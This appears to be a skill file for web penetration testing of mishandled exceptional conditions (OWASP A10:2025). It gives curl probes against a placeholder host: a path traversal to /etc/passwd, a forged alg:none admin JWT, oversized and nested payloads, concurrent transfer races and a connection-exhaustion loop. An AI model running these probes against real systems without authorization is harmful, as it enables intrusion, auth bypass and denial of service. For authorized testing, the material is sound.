---
name: exceptional_conditions
description: Testing for mishandled exceptional conditions that leak information, bypass security controls, or cause denial of service (OWASP A10:2025)
---

# Mishandling of Exceptional Conditions

OWASP A10:2025. When applications fail to properly handle errors, edge cases, and resource exhaustion, they expose stack traces, internal paths, debug information, or worse - fail open and grant unauthorized access. This category maps to 24 CWEs including CWE-209, CWE-248, CWE-754, CWE-755, CWE-390, CWE-392.

## Attack Surface

**Error Responses**
- HTTP 500 responses with full stack traces, source code snippets, or framework debug pages
- API error messages leaking internal service names, database schemas, file paths
- Debug/development mode accidentally enabled in production

**Exception Handling Paths**
- Catch blocks that fail open (granting access when verification throws)
- Missing catch blocks allowing unhandled exceptions to propagate
- Race conditions in error recovery paths leaving inconsistent state

**Resource Boundaries**
- Memory exhaustion, file descriptor limits, connection pool depletion
- Timeout handling that skips authorization or validation
- Integer overflow/underflow in size calculations

## Key Vulnerabilities

### Stack Trace / Debug Information Leakage

```bash
# Trigger verbose error responses
curl -v https://target.com/api/nonexistent
curl -v https://target.com/api/users/../../etc/passwd
curl -v -X POST https://target.com/api/login -H "Content-Type: application/json" -d '{"username":null}'
curl -v https://target.com/api/users/-1
curl -v https://target.com/api/search?q=%00

# Check for debug/development mode indicators
curl -s https://target.com/api/error | grep -iE 'stack.?trace|traceback|debug|at .+\(.+:\d+\)|File ".+".*line \d+|SQLSTATE|vendor/'
# Django debug mode
curl -s https://target.com/nonexistent | grep -c 'DJANGO_SETTINGS_MODULE\|Traceback\|DEBUG = True'
# Express/Node
curl -s https://target.com/nonexistent -H "Accept: text/html" | grep -c 'at Object\.\|at Module\.\|node_modules'
# Spring Boot
curl -s https://target.com/error | grep -c 'Whitelabel Error Page\|java\.\|org\.springframework'
# Laravel
curl -s https://target.com/nonexistent | grep -c 'Whoops\|vendor/laravel\|APP_KEY'
```

### Failing Open on Errors

When authentication/authorization logic catches exceptions and defaults to allowing access:
```
# Test: Send requests that cause parsing/validation errors in auth middleware
# Malformed JWT tokens that might cause parsing exceptions
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0." https://target.com/api/admin
# Oversized headers that might cause buffer exceptions in auth checks
python3 -c "print('A'*65536)" | xargs -I{} curl -H "Authorization: Bearer {}" https://target.com/api/admin
# Unexpected auth header format
curl -H "Authorization: Basic NOT_BASE64_%%%" https://target.com/api/admin
curl -H "Authorization: Bearer " https://target.com/api/admin
curl -H "Authorization: INVALID" https://target.com/api/admin
```

### Malformed Input Triggering Exceptions

```bash
# Unexpected Content-Type mismatches
curl -X POST https://target.com/api/data -H "Content-Type: application/xml" -d '<xml>test</xml>'
curl -X POST https://target.com/api/data -H "Content-Type: text/plain" -d 'raw data'
curl -X POST https://target.com/api/data -H "Content-Type: multipart/form-data" -d '{}'
curl -X POST https://target.com/api/data -H "Content-Type: application/json" -d 'NOT_JSON'

# Oversized payloads
python3 -c "import json; print(json.dumps({'key': 'A'*10000000}))" | curl -X POST -H "Content-Type: application/json" -d @- https://target.com/api/data

# Deeply nested JSON
python3 -c "s=''; exec('s=\"{\\\"a\\\":\" + s + \"}\"' * 1000 if False else None); print('{' * 500 + '\"a\":1' + '}' * 500)" | curl -X POST -H "Content-Type: application/json" -d @- https://target.com/api/data

# Null bytes and encoding issues
curl -X POST https://target.com/api/users -H "Content-Type: application/json" -d '{"name":"test\u0000admin"}'
```

### Race Conditions in Error Paths

```bash
# Concurrent requests during error state - check for inconsistent responses
# Use GNU parallel or custom script to send simultaneous requests
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}" https://target.com/api/transfer -X POST \
    -H "Content-Type: application/json" -d '{"amount":999999999}' &
done
wait

# Race between validation and execution
# Send valid and invalid requests simultaneously to same endpoint
```

### Resource Exhaustion Leading to Bypass

```bash
# Connection pool exhaustion - open many connections without closing
for i in $(seq 1 1000); do
  curl -s --max-time 30 -H "Connection: keep-alive" https://target.com/api/endpoint &
done

# File descriptor exhaustion via multipart uploads
# Memory exhaustion via large request bodies (check if size limits enforced before auth)

# Timeout-based bypass: slow request that causes auth check to timeout
# but allows request to proceed to handler
curl --max-time 60 -H "Authorization: Bearer VALID_TOKEN" \
  -H "X-Forwarded-For: $(python3 -c "print(','.join(['10.0.0.' + str(i) for i in range(255)]))")" \
  https://target.com/api/admin
```

### Null Pointer / Undefined State Leakage

```bash
# Missing required fields
curl -X POST https://target.com/api/users -H "Content-Type: application/json" -d '{}'
curl -X POST https://target.com/api/users -H "Content-Type: application/json" -d '{"email":null}'

# Empty arrays/objects where scalars expected
curl -X POST https://target.com/api/users -H "Content-Type: application/json" -d '{"id":[]}'
curl -X POST https://target.com/api/users -H "Content-Type: application/json" -d '{"id":{}}'

# Type confusion
curl -X POST https://target.com/api/users -H "Content-Type: application/json" -d '{"id":true}'
curl -X POST https://target.com/api/users -H "Content-Type: application/json" -d '{"id":1.7976931348623157E+10308}'
```

## Testing Methodology

1. **Error enumeration** - Map all error responses across endpoints; look for verbose errors, stack traces, internal paths
2. **Content-Type fuzzing** - Send unexpected content types to every endpoint; observe how parsers fail
3. **Boundary testing** - Oversized payloads, deeply nested structures, extreme numeric values, empty bodies
4. **Auth error paths** - Malformed tokens, expired certs, corrupted session data; verify app denies (not allows) on parsing failure
5. **Concurrent error states** - Race conditions in validation/auth when exceptions occur mid-flow
6. **Resource limits** - Test connection limits, memory bounds, timeout behavior under load
7. **Null/missing fields** - Omit required fields, send null values, wrong types; check for unhandled exceptions
8. **Production vs development** - Verify debug mode is disabled, custom error pages are in place

## Validation

- Capture stack traces or internal paths leaked in error responses
- Demonstrate fail-open behavior where an exception in auth logic grants access
- Show inconsistent state caused by race conditions in error handling paths
- Prove resource exhaustion causes security controls to be bypassed
- Document error messages that reveal technology stack, file paths, database details, or internal IPs

## False Positives

- Generic error pages that happen to include framework names but no actionable detail
- Intentional verbose errors on internal/admin endpoints behind VPN
- Health check endpoints designed to expose version information

## Impact

- Information disclosure: stack traces reveal source code paths, library versions, database schemas
- Authentication bypass: fail-open error handling grants access when verification throws
- Authorization bypass: timeout or resource exhaustion causes security middleware to be skipped
- Denial of service: unhandled exceptions crash workers, resource exhaustion degrades availability
- State corruption: race conditions in error recovery leave data in inconsistent/exploitable state

## Pro Tips

1. Always check both JSON and HTML error formats - many APIs return verbose HTML debug pages when Accept header is text/html
2. Compare error responses between environments if accessible (staging often has debug enabled)
3. Look for error ID/reference numbers in responses - these can sometimes be used to query internal logging endpoints
4. Monitor response times: a timeout that returns 200 instead of 401 suggests auth was skipped
5. Test error handling under load - security controls often degrade before application logic does
6. Check if error responses bypass CORS or CSP headers that normal responses include
